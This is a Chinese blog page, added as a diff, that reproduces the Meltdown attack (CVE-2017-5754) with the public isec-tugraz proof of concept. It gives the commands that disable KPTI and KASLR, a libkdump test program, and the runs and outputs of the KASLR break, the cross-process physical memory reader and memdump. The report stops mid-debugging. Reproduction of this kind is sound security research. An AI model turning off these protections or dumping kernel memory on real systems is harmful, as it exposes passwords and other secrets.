@@ -1,0 +1,781 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="yb0os1">
+  <meta name="keywords" content="yb0os1">
+  
+    <meta name="description" content="复现报告 信息  标题: Meltdown: Reading Kernel Memory from User Space 会议: USENIX Security 2018 作者: Moritz Lipp, Michael Schwarz, Daniel Gruss, et al. 论文链接: https:&#x2F;&#x2F;www.usenix.org&#x2F;system&#x2F;files&#x2F;conference&#x2F;usenix">
+<meta property="og:type" content="website">
+<meta property="og:title" content="page.title">
+<meta property="og:url" content="https://yb0os1.github.io/0temp/0-%E7%A0%94%E7%A9%B6%E7%94%9F/%E9%A1%B9%E7%9B%AE/%E5%A4%8D%E7%8E%B0/Meltdown.html">
+<meta property="og:site_name" content="yb0os1">
+<meta property="og:description" content="复现报告 信息  标题: Meltdown: Reading Kernel Memory from User Space 会议: USENIX Security 2018 作者: Moritz Lipp, Michael Schwarz, Daniel Gruss, et al. 论文链接: https:&#x2F;&#x2F;www.usenix.org&#x2F;system&#x2F;files&#x2F;conference&#x2F;usenix">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719150830410.png">
+<meta property="og:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719205443860.png">
+<meta property="og:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719205906918.png">
+<meta property="og:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719230528964.png">
+<meta property="og:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719230521740.png">
+<meta property="og:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719232418524.png">
+<meta property="og:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719221935761.png">
+<meta property="og:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719225328916.png">
+<meta property="og:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719225437883.png">
+<meta property="article:published_time" content="2026-10-04T05:02:31.585Z">
+<meta property="article:modified_time" content="2025-11-17T12:46:49.493Z">
+<meta property="article:author" content="yb0os1">
+<meta property="article:tag" content="yb0os1">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:%5CTypora%5Cimgs%5Cimage-20250719150830410.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>page.title - yb0os1</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"yb0os1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"collapseDepth":1,"headingSelector":"h1, h2, h3, h4, h5, h6","scrollOffset":80,"expand":true,"init_open":true,"number":true,"wrap":false,"max_depth":6,"min_depth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2026-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>
+        yb0os1~🏠
+      </strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+      data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
+      aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+            
+              
+                
+                  <!-- 修复核心：拆分跳转区域和下拉箭头 -->
+                  <li class="nav-item dropdown">
+                    <!-- 可跳转的主文字区域 -->
+                    <a class="nav-link" href="javascript:;" target="_self" style="display: inline-block;">
+                      
+                        <span>💬 杂项</span>
+                    </a>
+                    <!-- 仅负责展开下拉的箭头，不拦截跳转 -->
+                    <a class="nav-link dropdown-toggle" href="javascript:;" role="button" data-toggle="dropdown"
+                      aria-haspopup="true" aria-expanded="false"
+                      style="display: inline-block; margin-left: -20px !important;">
+                    </a>
+                    <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                      
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/categories/"
+                                target="_self">
+                                
+                                  <span>分类</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/archives/"
+                                target="_self">
+                                
+                                  <span>归档</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/tags/"
+                                target="_self">
+                                
+                                  <span>标签</span>
+                              </a>
+                              
+                    </div>
+                  </li>
+                  
+                      
+          
+            
+              
+                
+                  <!-- 修复核心：拆分跳转区域和下拉箭头 -->
+                  <li class="nav-item dropdown">
+                    <!-- 可跳转的主文字区域 -->
+                    <a class="nav-link" href="/java/" target="_self" style="display: inline-block;">
+                      
+                        <span>☕️ Java</span>
+                    </a>
+                    <!-- 仅负责展开下拉的箭头，不拦截跳转 -->
+                    <a class="nav-link dropdown-toggle" href="javascript:;" role="button" data-toggle="dropdown"
+                      aria-haspopup="true" aria-expanded="false"
+                      style="display: inline-block; margin-left: -20px !important;">
+                    </a>
+                    <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                      
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/java/basics/"
+                                target="_self">
+                                
+                                  <span>基础</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/java/JVM/"
+                                target="_self">
+                                
+                                  <span>JVM</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/java/JUC/"
+                                target="_self">
+                                
+                                  <span>JUC</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/java/spring/"
+                                target="_self">
+                                
+                                  <span>Spring全家桶</span>
+                              </a>
+                              
+                    </div>
+                  </li>
+                  
+                      
+          
+            
+              
+                
+                  <!-- 修复核心：拆分跳转区域和下拉箭头 -->
+                  <li class="nav-item dropdown">
+                    <!-- 可跳转的主文字区域 -->
+                    <a class="nav-link" href="/cpp/" target="_self" style="display: inline-block;">
+                      
+                        <span>🔧 C++</span>
+                    </a>
+                    <!-- 仅负责展开下拉的箭头，不拦截跳转 -->
+                    <a class="nav-link dropdown-toggle" href="javascript:;" role="button" data-toggle="dropdown"
+                      aria-haspopup="true" aria-expanded="false"
+                      style="display: inline-block; margin-left: -20px !important;">
+                    </a>
+                    <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                      
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/cpp/basics/"
+                                target="_self">
+                                
+                                  <span>基础</span>
+                              </a>
+                              
+                    </div>
+                  </li>
+                  
+                      
+          
+            
+              
+                
+                    <li class="nav-item">
+                      <a class="nav-link" href="/408" target="_self">
+                        
+                          <span>💻 计算机基础</span>
+                      </a>
+                    </li>
+                    
+                      
+          
+            
+              
+                
+                  <!-- 修复核心：拆分跳转区域和下拉箭头 -->
+                  <li class="nav-item dropdown">
+                    <!-- 可跳转的主文字区域 -->
+                    <a class="nav-link" href="/database" target="_self" style="display: inline-block;">
+                      
+                        <span>🗄️ 数据库</span>
+                    </a>
+                    <!-- 仅负责展开下拉的箭头，不拦截跳转 -->
+                    <a class="nav-link dropdown-toggle" href="javascript:;" role="button" data-toggle="dropdown"
+                      aria-haspopup="true" aria-expanded="false"
+                      style="display: inline-block; margin-left: -20px !important;">
+                    </a>
+                    <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                      
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/database/mysql/"
+                                target="_self">
+                                
+                                  <span>MySQL</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/database/redis/"
+                                target="_self">
+                                
+                                  <span>Redis</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/database/kv/"
+                                target="_self">
+                                
+                                  <span>Kv</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/database/ClickHouse/"
+                                target="_self">
+                                
+                                  <span>ClickHouse</span>
+                              </a>
+                              
+                    </div>
+                  </li>
+                  
+                      
+          
+            
+              
+                
+                  <!-- 修复核心：拆分跳转区域和下拉箭头 -->
+                  <li class="nav-item dropdown">
+                    <!-- 可跳转的主文字区域 -->
+                    <a class="nav-link" href="/distributed" target="_self" style="display: inline-block;">
+                      
+                        <span>🔗 分布式架构</span>
+                    </a>
+                    <!-- 仅负责展开下拉的箭头，不拦截跳转 -->
+                    <a class="nav-link dropdown-toggle" href="javascript:;" role="button" data-toggle="dropdown"
+                      aria-haspopup="true" aria-expanded="false"
+                      style="display: inline-block; margin-left: -20px !important;">
+                    </a>
+                    <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                      
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/distributed/queue/"
+                                target="_self">
+                                
+                                  <span>消息队列</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/distributed/transaction/"
+                                target="_self">
+                                
+                                  <span>分布式事务</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/distributed/consistency/"
+                                target="_self">
+                                
+                                  <span>一致性协议</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/distributed/microservice/"
+                                target="_self">
+                                
+                                  <span>微服务架构</span>
+                              </a>
+                              
+                        
+                          
+                            
+                              <a class="dropdown-item" href="/distributed/rpc/"
+                                target="_self">
+                                
+                                  <span>RPC</span>
+                              </a>
+                              
+                    </div>
+                  </li>
+                  
+                      
+          
+            
+              
+                
+                    <li class="nav-item">
+                      <a class="nav-link" href="/scene" target="_self">
+                        
+                          <span>🚀 场景</span>
+                      </a>
+                    </li>
+                    
+                      
+          
+            
+              
+                
+                    <li class="nav-item">
+                      <a class="nav-link" href="/AI" target="_self">
+                        
+                          <span>🤖 AI</span>
+                      </a>
+                    </li>
+                    
+                      
+          
+            
+              
+                
+                    <li class="nav-item">
+                      <a class="nav-link" href="/practice" target="_self">
+                        
+                          <span>💼 实习</span>
+                      </a>
+                    </li>
+                    
+                      
+          
+            
+              
+                
+                    <li class="nav-item">
+                      <a class="nav-link" href="/about/" target="_self">
+                        
+                          <span>👨‍💻 关于</span>
+                      </a>
+                    </li>
+                    
+                      
+                        
+                          <li class="nav-item" id="search-btn">
+                            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal"
+                              data-target="#modalSearch" aria-label="Search">
+                              <i class="iconfont icon-search"></i>
+                            </a>
+                          </li>
+                          
+                            
+                              
+                                <li class="nav-item" id="color-toggle-btn">
+                                  <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+                                    <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+                                  </a>
+                                </li>
+                                
+      </ul>
+    </div>
+  </div>
+  <style>
+    /* 鼠标 hover 分类项时，文字和箭头同时亮 */
+    .navbar .navbar-nav>.nav-item.dropdown:hover>.nav-link,
+    .navbar .navbar-nav>.nav-item.dropdown:hover>.nav-link.dropdown-toggle {
+      color: #42b9f4 !important;
+      /* 替换成你主题的高亮蓝色（和图中一致） */
+    }
+
+    /* 当前页面为分类页时，文字和箭头同时激活亮 */
+    .navbar .navbar-nav>.nav-item.dropdown.active>.nav-link,
+    .navbar .navbar-nav>.nav-item.dropdown.active>.nav-link.dropdown-toggle {
+      color: #42b9f4 !important;
+      /* 同样替换为你的高亮色 */
+    }
+  </style>
+  <!-- 修复下拉菜单点击外部关闭的问题 -->
+  <script>
+    document.addEventListener('click', function (e) {
+      const dropdowns = document.querySelectorAll('.dropdown');
+      dropdowns.forEach(dropdown => {
+        if (!dropdown.contains(e.target)) {
+          dropdown.classList.remove('show');
+          const menu = dropdown.querySelector('.dropdown-menu');
+          if (menu) menu.classList.remove('show');
+        }
+      });
+    });
+  </script>
+</nav>
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="page.title"></span>
+          
+        </div>
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div id="board"
+          >
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+<article class="page-content">
+  <h1>复现报告</h1>
+<h2 id="信息">信息</h2>
+<ul>
+<li><strong>标题</strong>: <em>Meltdown: Reading Kernel Memory from User Space</em></li>
+<li><strong>会议</strong>: USENIX Security 2018</li>
+<li><strong>作者</strong>: Moritz Lipp, Michael Schwarz, Daniel Gruss, et al.</li>
+<li><strong>论文链接</strong>: <a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-lipp.pdf">https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-lipp.pdf</a></li>
+<li><strong>CVE 编号</strong>: CVE-2017-5754</li>
+<li><strong>漏洞类型</strong>: CPU 级别特权绕过 + 缓存侧信道攻击</li>
+<li>**代码仓库：**GitHub 仓库：<a target="_blank" rel="noopener" href="https://github.com/isec-tugraz/meltdown">https://github.com/isec-tugraz/meltdown</a></li>
+<li>i7-6700</li>
+</ul>
+<h2 id="简要攻击原理">简要攻击原理</h2>
+<p>Meltdown 攻击基于以下三个核心机制：</p>
+<ol>
+<li><strong>CPU乱序执行（Out-of-Order Execution）</strong> 允许 CPU 提前执行非法访问的后续操作</li>
+<li><strong>权限检查滞后（Delayed Exception）</strong>，异常发生在实际访存之后</li>
+<li><strong>缓存侧信道攻击（Flush+Reload）</strong> 用于在不读取寄存器的情况下探测访存是否命中缓存</li>
+</ol>
+<p>攻击流程如下：</p>
+<ol>
+<li>访问非法内核地址（会抛出异常，但在那之前 CPU 已投机执行下一条指令）</li>
+<li>这条指令会用该值作为数组索引，访问内存，从而让某一缓存行被加载</li>
+<li>攻击者随后用 <code>Flush+Reload</code> 技术扫描这个缓存，判断哪个字节被访问，从而推断数据</li>
+</ol>
+<h2 id="环境准备">环境准备</h2>
+<p>1硬件</p>
+<ul>
+<li>Intel x86_64 处理器（2010 年之后的 Intel CPU 通常都受影响）</li>
+<li>Intel x86-64 支持 Meltdown 的 CPU（如 Intel i5、i7）</li>
+</ul>
+<p>2软件</p>
+<ul>
+<li>Ubuntu 16.04 / 18.04（或任意较老的 Linux，建议 4.13 以下的内核）</li>
+<li>GCC ≥ 5</li>
+<li>关闭 KAISER / KPTI / Kernel Page Table Isolation</li>
+</ul>
+<p>3下载构建代码</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/isec-tugraz/meltdown.git<br><span class="hljs-built_in">cd</span> meltdown<br>make<br></code></pre></td></tr></table></figure>
+<p>编译成功会生成名为 <code>meltdown</code> 的可执行文件</p>
+<p>4禁用 KPTI / KASLR（非常关键）</p>
+<p>编辑 <code>/etc/default/grub</code>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> nano /etc/default/grub<br><span class="hljs-comment"># 找到 GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash&quot;</span><br><span class="hljs-comment"># 修改为 	GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash pti=off nokaslr&quot;</span><br><span class="hljs-built_in">sudo</span> update-grub<br><span class="hljs-built_in">sudo</span> reboot<br></code></pre></td></tr></table></figure>
+<p>5验证参数是否生效</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> /proc/cmdline<br></code></pre></td></tr></table></figure>
+<p>应包含：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">...</span> pti=off nokaslr <span class="hljs-string">...</span><br></code></pre></td></tr></table></figure>
+<p>检查内核版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -r<br></code></pre></td></tr></table></figure>
+<p>确保内核版本低于 4.15，否则建议降级或使用 LiveCD</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt install -y build-essential git linux-headers-$(<span class="hljs-built_in">uname</span> -r) \<br>                    msr-tools hugepages stress glibc-static<br>                    <br><span class="hljs-comment"># 需要进行运行这两个才能跑出来</span><br><span class="hljs-built_in">echo</span> 1024 | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /proc/sys/vm/nr_hugepages<br><span class="hljs-built_in">echo</span> 0 | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /proc/sys/kernel/kptr_restrict<br></code></pre></td></tr></table></figure>
+<h2 id="攻击复现">攻击复现</h2>
+<p>自检</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">taskset 0x1 ./test<br></code></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Expect: Welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> wonderful world <span class="hljs-keyword">of</span> microarchitectural attacks<br>   Got: Welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> wonderful world <span class="hljs-keyword">of</span> microarchitectural attacks<br></code></pre></td></tr></table></figure>
+<p><img src="D:%5CTypora%5Cimgs%5Cimage-20250719150830410.png" srcset="/img/loading.gif" lazyload alt="image-20250719150830410"></p>
+<p>一个普通用户态进程（./test）已经能够绕过页表权限位，成功调用 libkdump 提供的 Meltdown 原语，从“任意地址”（本次为<strong>用户空间字符串地址</strong>）读取字节并打印；若把目标地址换成内核虚拟地址，即可同样读取内核空间数据。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;libkdump.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *strings[] = &#123;<br>    <span class="hljs-string">&quot;If you can read this, at least the auto configuration is working&quot;</span>,<br>    <span class="hljs-string">&quot;Generating witty test message...&quot;</span>,<br>    <span class="hljs-string">&quot;Go ahead with the real exploit if you dare&quot;</span>,<br>    <span class="hljs-string">&quot;Have a good day.&quot;</span>,<br>    <span class="hljs-string">&quot;Welcome to the wonderful world of microarchitectural attacks&quot;</span>,<br>    <span class="hljs-string">&quot;Pay no attention to the content of this string&quot;</span>,<br>    <span class="hljs-string">&quot;Please wait while we steal your secrets...&quot;</span>,<br>    <span class="hljs-string">&quot;Would you like fries with that?&quot;</span>,<br>    <span class="hljs-string">&quot;(insert random quote here)&quot;</span>,<br>    <span class="hljs-string">&quot;Don&#x27;t panic...&quot;</span>,<br>    <span class="hljs-string">&quot;Wait, do you smell something burning?&quot;</span>,<br>    <span class="hljs-string">&quot;How did you get here?&quot;</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-type">libkdump_config_t</span> config;<br>  config = libkdump_get_autoconfig();<br>  libkdump_init(config);<br><br>  srand(time(<span class="hljs-literal">NULL</span>));<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *test = strings[rand() % (<span class="hljs-keyword">sizeof</span>(strings) / <span class="hljs-keyword">sizeof</span>(strings[<span class="hljs-number">0</span>]))];<span class="hljs-comment">//随机选择一个用户空间可见的字段串</span><br>  <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Expect: \x1b[32;1m%s\x1b[0m\n&quot;</span>, test);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   Got: \x1b[33;1m&quot;</span>);<br>  <span class="hljs-keyword">while</span> (index &lt; <span class="hljs-built_in">strlen</span>(test)) &#123;<br>    <span class="hljs-type">int</span> value = libkdump_read((<span class="hljs-type">size_t</span>)(test + index));<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isprint</span>(value))<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, value);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    index++;<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\x1b[0m\n&quot;</span>);<br>  libkdump_cleanup();<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>1打破 KASLR（kaslr）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> taskset 0x1 ./kaslr<br><span class="hljs-comment"># [+] Direct physical map offset: 0xffff8a0d00000000</span><br></code></pre></td></tr></table></figure>
+<p><img src="D:%5CTypora%5Cimgs%5Cimage-20250719205443860.png" srcset="/img/loading.gif" lazyload alt="image-20250719205443860"></p>
+<ul>
+<li>泄露了内核的直接物理映射 (Direct Physical Map) 的基地址偏移</li>
+<li>KASLR 是防护机制之一，目的是隐藏内核代码和数据的虚拟地址，防止攻击者利用已知地址发起攻击</li>
+</ul>
+<p>2可靠性测试（reliability）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> taskset 0x1 ./reliability 0xffff8a0d00000000<br><span class="hljs-comment">#[-] Success rate: 99.93% (read 1354 values)</span><br></code></pre></td></tr></table></figure>
+<p><img src="D:%5CTypora%5Cimgs%5Cimage-20250719205906918.png" srcset="/img/loading.gif" lazyload alt="image-20250719205906918"></p>
+<blockquote>
+<p>从指定物理偏移（<code>0xffff888000000000</code>，即直接物理映射偏移）对应的内存读取成功率</p>
+<p>如果成功率过低</p>
+<p>内核版本过高，≤ 4.14</p>
+<p>BIOS 关闭</p>
+<ul>
+<li>超线程（HT）off</li>
+<li>微码更新（Microcode Update）off（若主板允许）</li>
+</ul>
+</blockquote>
+<p>3跨进程读取物理内存（physical_reader）</p>
+<p>先开一个 目标进程 并放入 secret</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"> <span class="hljs-built_in">sudo</span> taskset 0x1 ./secret<br><span class="hljs-comment"># [+] Secret: If you can read this, this is really bad</span><br><span class="hljs-comment"># [+] Physical address of secret: 0x204e342e0</span><br><span class="hljs-comment"># [+] Exit with Ctrl+C if you are done reading the secret</span><br></code></pre></td></tr></table></figure>
+<p><img src="D:%5CTypora%5Cimgs%5Cimage-20250719230528964.png" srcset="/img/loading.gif" lazyload alt="image-20250719230528964"></p>
+<p>另开终端 读取</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> taskset 0x1 ./physical_reader 0x2326992b8 0xffff8a0d00000000<br></code></pre></td></tr></table></figure>
+<p><img src="D:%5CTypora%5Cimgs%5Cimage-20250719230521740.png" srcset="/img/loading.gif" lazyload alt="image-20250719230521740"></p>
+<p><img src="D:%5CTypora%5Cimgs%5Cimage-20250719232418524.png" srcset="/img/loading.gif" lazyload alt="image-20250719232418524"></p>
+<p>4整内存转储（memdump）</p>
+<p>先填充大段可识别内存</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> ./memory_filler 1   <span class="hljs-comment"># 填充 1 GB</span><br></code></pre></td></tr></table></figure>
+<p>转储</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> taskset 0x1 ./memdump 0x240000000 -1 0xffff888000000000<br></code></pre></td></tr></table></figure>
+<p>屏幕会出现大量字符串片段，甚至 <strong>Firefox/Chrome 密码、HTTP 请求</strong> 等</p>
+<p>这里需要依赖浏览器等等，所以我们看不出来什么东西</p>
+<p><img src="D:%5CTypora%5Cimgs%5Cimage-20250719221935761.png" srcset="/img/loading.gif" lazyload alt="image-20250719221935761"></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> taskset 0x2 ./physical_reader 0x16496d870 0xffff888000000000<br></code></pre></td></tr></table></figure>
+<p>跑不出来 debug一下</p>
+<p>1、关闭了 KPTI / Spectre / 微码补丁</p>
